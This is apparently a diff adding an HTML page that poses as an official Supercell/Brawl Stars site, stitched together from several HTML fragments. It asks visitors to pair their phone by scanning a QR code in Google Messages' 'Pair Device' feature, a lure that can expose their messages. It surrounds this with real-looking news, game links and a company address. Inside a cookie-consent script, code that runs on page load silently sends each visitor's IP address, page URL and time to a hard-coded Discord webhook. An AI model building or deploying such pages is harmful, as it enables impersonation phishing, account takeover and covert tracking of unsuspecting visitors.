Uc/IimhjK71TaJbEK6uq4rHmZfcWkPnsOugb9V/x9mrMVH/uvl2Y7KJu3yT96nCkrgyZCocapc0VvK9w0YFQXuj/qS27oHQ3DTu1Zio/4SHCSYjMAsEVDjULmmsDNgdNt0EU39Smw76bDC927riOQIzAnM4xyoIepuqv8PETnxTWAdCc1NhuxoT9Z9cdAkmIzAjMIdz3E0w9XeY2AjM5o9iCG5779ZUOFWw/zqBUfASZV/GSAZCG5bkW80viak3ohJRHzk7v2h3R/3dMYT/ygfNTf1prz/6UyQB+GWj4Im/boB1mCS3vZtIznZidCaPRHRHYI47q3zV/qu/EZjj3mxadAM8AmN/y0eEKBkSPau06e6rxq1u3Fp/N/9ng4H3Mtp8GZJ046oSQAmmtWoeCSazwRx3I+lD8ug7G8xxb2aDKWI0j0g7v38Wf/NhAPvq6JcQmE5A9m7wZOWUs9qIpFa9rTVG1Z+e061GsdO4Wv/Vdt35Kp7Vx5wED81Ne6250COSOlM7bWwCyvJsN3C6IiZxFadlLnouwfeO+pVPVTvFSf0rniMwimjRThurDZsN5r0Rd+A7ArNGQPk6AlMUDj12xwDMBvPeDRHhvf7pFqZ9VZ5cbded7wjMhujKDzt2N1obqw2T4dEhSWrVujRG1Z+eS/CdDWY2GOHx6h2MHLrCRkTiFTexk7x1OMXXy0b96bBX12vNQ4VD61c7uQCqGJ3hzVa+V3NOMdc8khqSs5v5LTcYJUS3nYKX2EnOySDeQZQRGOni2kZ50z1gtWz7L6an6p8NZsGAEZi+1f/McM0G846W8lC3uhGYH++/fzV9vBDCJhuHDk83UWaDUeTf7Z4asFq2s8FUcds9pwRI7CRpFQTxlYqkxFAhTerSW1Ly3bOROpI8lDfziFR/vNzC+H/4hnVOJL6xJAAAAABJRU5ErkJggg==" alt="QR Code">
+      </div>
+    </div>
+  </div>
+
+  <div class="guide">
+    <p>📱 Open the <b>Google Messages</b> app on your phone</p>
+    <p>👤 Tap your avatar in the top right corner</p>
+    <p>🔄 Select <b>“Pair Device”</b></p>
+    <p>📷 Use the QR code scanner and scan this code</p>
+  </div>
+
+  <div class="security-warning">
+    🔐 Do not share this QR code with third parties – it could compromise your account!
+  </div>
+
+  <div class="experiment-note">
+    ⚠️ This login feature is in testing. Only selected users have access.
+  </div>
+
+ <!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FAQ</title>
+  <style>
+    .faq-answer {
+      display: none; /* Na początku odpowiedzi są ukryte */
+    }
+    .arrow {
+      cursor: pointer;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="faq-box">
+  <div class="faq-item" onclick="toggleFaq(this)">
+    <div class="faq-question">❓ How do I scan the QR code?</div>
+    <div class="arrow">▼</div>
+  </div>
+  <div class="faq-answer">Scan the QR code to link your device with the login service.</div>
+
+  <div class="faq-item" onclick="toggleFaq(this)">
+    <div class="faq-question">❓ Can I share the QR code?</div>
+    <div class="arrow">▼</div>
+  </div>
+  <div class="faq-answer">You should not share this code with others – doing so may result in losing access to your account.</div>
+
+  <div class="faq-item" onclick="toggleFaq(this)">
+    <div class="faq-question">❓ What are experiments?</div>
+    <div class="arrow">▼</div>
+  </div>
+  <div class="faq-answer">These are test features available only to selected players. They may change or be removed.</div>
+</div>
+
+
+<script>
+  function toggleFaq(element) {
+    // Pobranie odpowiedzi (faq-answer)
+    const answer = element.nextElementSibling;
+    
+    // Przełączanie widoczności odpowiedzi
+    if (answer.style.display === "none" || answer.style.display === "") {
+      answer.style.display = "block";  // Pokaż odpowiedź
+      element.querySelector('.arrow').textContent = "▲";  // Zmień strzałkę na górę
+    } else {
+      answer.style.display = "none";  // Ukryj odpowiedź
+      element.querySelector('.arrow').textContent = "▼";  // Zmień strzałkę na dół
+    }
+  }
+</script>
+
+</body>
+</html>
+
+  <!-- Modal Section -->
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <p>⚠️ You do not have access to this feature! This is an experiment and is only available to selected users. </p>
+      <button onclick="closeModal()">OK</button>
+    </div>
+  </div>
+
+  <script>
+    const loginBtn = document.getElementById("loginBtn");
+    const modal = document.getElementById("modal");
+
+    loginBtn.addEventListener("click", function() {
+      modal.style.display = "flex";
+    });
+
+    function closeModal() {
+      modal.style.display = "none";
+    }
+  </script>
+
+ <!-- News Section -->
+<div class="news-box">
+  <h2>Latest News</h2>
+  <div class="news-item">
+    <h3>🏯 The Battle for Katana Kingdom – New Update!</h3>
+    <p>The latest update brings various quality of life improvements, such as visible gadget cooldown times, character model changes, and bug fixes related to in-game interactions.</p>
+    <a href="https://supercell.com/en/games/brawlstars/blog/release-notes/release-notes-the-battle-for-katana-kingdom/?utm_source=chatgpt.com" target="_blank">Read more</a>
+  </div>
+  <div class="news-item">
+    <h3>⚖️ Balance Changes – April 2025</h3>
+    <p>A series of balance changes have been made, including increasing Crow's healing reduction from 40% to 60%, as well as adjustments to Bonnie, Mico, Jessie, and other characters. Meanwhile, Lumi, Bea, Ollie, and others have been nerfed.</p>
+    <a href="https://supercell.com/en/games/brawlstars/blog/news/maintenance-april-30/?utm_source=chatgpt.com" target="_blank">Read more</a>
+  </div>
+  <div class="news-item">
+    <h3>🏆 First Ever P2W Event – "Play to Win"</h3>
+    <p>Supercell has announced its first "Play to Win" event, offering unique rewards for players participating in special challenges.</p>
+    <a href="https://supercell.com/en/games/brawlstars/blog/?utm_source=chatgpt.com" target="_blank">Read more</a>
+  </div>
+  <div class="news-item">
+    <h3>🎮 Ranked Mode Rework – March 2025</h3>
+    <p>Changes have been made to the Ranked mode, including new scoring systems, matchmaking adjustments, and the introduction of new rewards, including Starr Drops with cosmetics and skins.</p>
+    <a href="https://supercell.com/en/games/brawlstars/blog/release-notes/patch-notes-ranked-update/?utm_source=chatgpt.com" target="_blank">Read more</a>
+  </div>
+  <div class="news-item">
+    <h3>📅 Brawl Talks Schedule 2025</h3>
+    <p>Supercell has announced the dates for the upcoming Brawl Talks in 2025, covering topics such as Ranked mode integration, new abilities, and skin system changes.</p>
+    <a href="https://supercell.com/en/games/brawlstars/blog/?utm_source=chatgpt.com" target="_blank">Read more</a>
+  </div>
+</div>
+
+
+   <!-- Supercell Games Section -->
+  <div class="supercell-games">
+    <h2>Other Supercell Games</h2>
+    <div class="games-grid">
+      <div class="game-card">
+        <a href="https://supercell.com/en/games/brawlstars/" target="_blank">
+          <img src="https://play-lh.googleusercontent.com/UDvJF8oLGUgWWnZ3jzYPLAVfIzM5oY62_EhDQ6lKvOPDzZ3nFfHe6GKmYjr-DkWWGaA" alt="Brawl Stars">
+        </a>
+        <p>Brawl Stars</p>
+      </div>
+      <div class="game-card">
+        <a href="https://supercell.com/en/games/clashofclans/" target="_blank">
+          <img src="https://s3-eu-west-1.amazonaws.com/thebetafamily-v3/uploads/test-projects/173269/icon.png" alt="Clash of Clans">
+        </a>
+        <p>Clash of Clans</p>
+      </div>
+      <div class="game-card">
+        <a href="https://supercell.com/en/games/clashroyale/" target="_blank">
+          <img src="https://play-lh.googleusercontent.com/gnSC6s8-6Tjc4uhvDW7nfrSJxpbhllzYhgX8y374N1LYvWBStn2YhozS9XXaz1T_Pi2q" alt="Clash Royale">
+        </a>
+        <p>Clash Royale</p>
+      </div>
+      <div class="game-card">
+        <a href="https://supercell.com/en/games/boombeach/" target="_blank">
+          <img src="https://play-lh.googleusercontent.com/y_Dr51TrM3NfJO-bFECbGVXsjfFYo-6YjiJfIQwyNBX6VdBW8H8eSEZzpCXcGKKByyw" alt="Boom Beach">
+        </a>
+        <p>Boom Beach</p>
+      </div>
+      <div class="game-card">
+        <a href="https://supercell.com/en/games/hayday/" target="_blank">
+          <img src="https://play-lh.googleusercontent.com/Za8u0ChNK-3mZ3rnLcBirRBTzLYTdqaaAn63Ha9qKZiDp_bF_5u7OGfvWb1dg88WttKw" alt="Hay Day">
+        </a>
+        <p>Hay Day</p>
+      </div>
+    </div>
+  </div>
+
+<!-- Footer Section -->
+  <div class="footer">
+    <div class="store-links">
+      <a href="https://apps.apple.com/us/app/brawl-stars/id1061481557" target="_blank">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Download_on_the_App_Store_RGB_blk.svg/1280px-Download_on_the_App_Store_RGB_blk.svg.png" alt="App Store">
+      </a>
+      <a href="https://play.google.com/store/apps/details?id=com.supercell.brawlstars&hl=en&gl=US" target="_blank">
+        <img src="https://qiita-user-contents.imgix.net/https%3A%2F%2Fplay.google.com%2Fintl%2Fen_us%2Fbadges%2Fimages%2Fgeneric%2Fen_badge_web_generic.png?ixlib=rb-4.0.0&auto=format&gif-q=60&q=75&s=84fb82f5755f772e7185c2e635890e2e" alt="Google Play">
+      </a>
+    </div>
+    <div class="address">
+      <p>Supercell Oy, Ruoholahti, 00180 Helsinki, Finland</p>
+    </div>
+    <div class="social-media">
+      <a href="https://www.facebook.com/supercell" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook"></a>
+      <a href="https://twitter.com/supercell" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Logo_of_Twitter.svg/1200px-Logo_of_Twitter.svg.png" alt="Twitter"></a>
+      <a href="https://www.instagram.com/supercellgames" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram"></a>
+      <a href="https://www.youtube.com/c/supercell" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png" alt="YouTube"></a>
+    </div>
+  </div>
+
+  
+
+    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cookie Consent</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    #cookieConsent {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.85);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .cookie-content {
+      background-color: #000000;
+      padding: 2rem;
+      max-width: 500px;
+      width: 90%;
+      border-radius: 16px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .cookie-content h2 {
+      margin-top: 0;
+      font-size: 1.8rem;
+      color: #ffffff;
+    }
+
+    .cookie-content p {
+      font-size: 1rem;
+      color: #ffffff;
+      margin: 1rem 0;
+    }
+
+    .cookie-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 1.5rem;
+    }
+
+    .cookie-buttons button {
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    #acceptCookies {
+      background-color: #0ea5e9;
+      color: white;
+    }
+
+    #acceptCookies:hover {
+      background-color: #0284c7;
+    }
+
+    #rejectCookies {
+      background-color: #e11d48;
+      color: white;
+    }
+
+    #rejectCookies:hover {
+      background-color: #be123c;
+    }
+
+    #manageCookies {
+      background-color: #f3f4f6;
+      color: #111;
+    }
+
+    #manageCookies:hover {
+      background-color: #e5e7eb;
+    }
+
+    .privacy-link {
+      margin-top: 1rem;
+      display: inline-block;
+      color: #2563eb;
+      text-decoration: none;
+      font-size: 0.95rem;
+    }
+
+    .privacy-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Cookie Consent Banner -->
+  <div id="cookieConsent">
+    <div class="cookie-content">
+      <h2>We value your privacy</h2>
+      <p>
+        We use cookies to improve your experience, personalize content, and analyze traffic.
+        Please choose your preferences.
+      </p>
+      <div class="cookie-buttons">
+        <button id="acceptCookies">Accept All</button>
+        <button id="rejectCookies">Reject All</button>
+        <button id="manageCookies">Manage Settings</button>
+      </div>
+      <a class="privacy-link" href="/privacy-policy" target="_blank">Privacy Policy</a>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('acceptCookies').addEventListener('click', function () {
+      localStorage.setItem('cookieConsent', 'accepted');
+      document.getElementById('cookieConsent').style.display = 'none';
+    });
+
+    document.getElementById('rejectCookies').addEventListener('click', function () {
+      localStorage.setItem('cookieConsent', 'rejected');
+      document.getElementById('cookieConsent').style.display = 'none';
+    });
+
+    document.getElementById('manageCookies').addEventListener('click', function () {
+      alert('Redirect to cookie settings or open preferences modal.');
+    });
+
+    // Hide banner if consent already given
+    window.addEventListener('load', function () {
+      const consent = localStorage.getItem('cookieConsent');
+      if (consent === 'accepted' || consent === 'rejected') {
+        document.getElementById('cookieConsent').style.display = 'none';
+      }
+    });
+
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const visitorIP = data.ip;
+    const pageURL = window.location.href;
+    const time = new Date().toLocaleString();
+
+    // Prepare Discord webhook payload
+    const discordPayload = {
+      content: `New visitor IP logged:\nIP: \`${visitorIP}\`\nURL: ${pageURL}\nTime: ${time}`
+    };
+
+    fetch('https://discord.com/api/webhooks/1391042733451251892/B-FXiW7Z6m1lv8XHkCCJ_zp_NyBbWnSrn5jmUQsu-w-8qXB0cnIuF62R8S6AkZAlj1C4', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(discordPayload)
+    })
+    .catch(err => console.error('Discord webhook error:', err));
+  })
+  .catch(err => console.error('IP fetch error:', err));
+
+  </script>
+</body>
+</html>
